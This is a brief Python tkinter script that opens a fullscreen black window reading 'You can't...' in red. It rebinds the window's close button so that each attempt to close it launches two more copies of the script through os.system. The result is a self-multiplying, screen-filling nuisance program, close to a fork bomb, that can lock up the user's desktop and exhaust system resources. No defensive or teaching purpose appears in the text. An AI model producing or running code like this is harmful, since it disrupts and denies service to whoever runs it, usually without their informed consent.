import tkinter as tk
import os

def open_more():
    os.system("python " + __file__)  
    os.system("python " + __file__)

root = tk.Tk()
root.attributes("-fullscreen", True)
root.configure(bg="black")
root.protocol("WM_DELETE_WINDOW", open_more)  

label = tk.Label(root, text="You can't... ", font=("Arial", 40, "bold"), fg="red", bg="black")
label.pack(expand=True)

root.mainloop()